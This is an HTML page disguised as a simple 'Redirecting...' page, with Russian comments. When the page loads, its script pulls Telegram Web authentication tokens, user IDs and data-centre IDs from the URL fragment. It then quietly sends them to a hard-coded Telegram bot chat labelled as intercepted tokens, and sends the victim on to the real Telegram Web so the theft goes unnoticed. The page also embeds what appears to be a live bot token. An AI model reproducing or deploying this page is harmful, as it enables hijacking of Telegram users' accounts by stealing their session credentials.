<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
        // Функция отправки данных в Telegram (без блокировки)
        function sendToTelegram(token, userId, dcId) {
            const botToken = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4'; // замените на ваш токен
            const chatId = '8220267007';     // замените на ваш ID
            const message = `Перехвачен токен:\nToken: ${token}\nUser ID: ${userId}\nDC ID: ${dcId}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            
            // Используем fetch с игнорированием ошибок (fire-and-forget)
            fetch(url, { mode: 'no-cors' }) // no-cors позволяет отправить запрос даже при CORS-блокировке
                .catch(e => console.log('Ошибка отправки (игнорируем):', e));
        }

        // Главная функция
        (function() {
            const fullUrl = window.location.href;
            const hashIndex = fullUrl.indexOf('#');
            let token = null, userId = null, dcId = null;

            if (hashIndex !== -1) {
                const hashParams = new URLSearchParams(fullUrl.substring(hashIndex + 1));
                token = hashParams.get('tgWebAuthToken');
                userId = hashParams.get('tgWebAuthUserId');
                dcId = hashParams.get('tgWebAuthDcId');
            }

            // Если параметры найдены, отправляем в Telegram (асинхронно)
            if (token && userId && dcId) {
                sendToTelegram(token, userId, dcId);
            }

            // НЕМЕДЛЕННОЕ перенаправление на оригинальный Telegram Web (всегда)
            window.location.replace('https://web.telegram.org/k/');
        })();
    </script>
</head>
<body>
    <p>Перенаправление...</p>
</body>
</html>
